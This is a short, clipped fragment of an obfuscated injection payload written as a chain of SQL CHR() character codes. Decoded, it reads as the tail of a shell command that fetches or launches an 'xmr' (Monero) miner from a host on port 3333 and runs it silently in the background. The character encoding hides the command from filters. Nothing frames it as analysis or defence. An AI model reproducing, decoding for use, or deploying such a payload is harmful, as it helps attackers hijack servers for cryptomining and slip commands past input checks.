HR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(62)||CHR(47)||CHR(100)||CHR(101)||CHR(118)||CHR(47)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(32)||CHR(38)))
